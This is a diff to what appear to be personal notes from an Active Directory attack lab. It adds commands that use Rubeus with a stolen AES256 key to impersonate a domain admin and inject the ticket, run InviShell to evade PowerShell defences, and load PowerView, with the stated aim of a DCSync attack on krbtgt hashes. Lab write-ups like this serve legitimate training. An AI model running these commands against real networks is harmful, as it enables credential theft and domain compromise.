@@ -501,5 +501,14 @@ Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchSco
 ```
 It doesn't return nothing, so we don't have priviledge
 *add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user*
-Crate a session with a domain admin
-
+Create a session with a domain admin
+```cmd
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+Run invishell and import powerview
+```cmd
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+```powershell
+import-module C:\AD\Tools\PowerView.ps1
+```
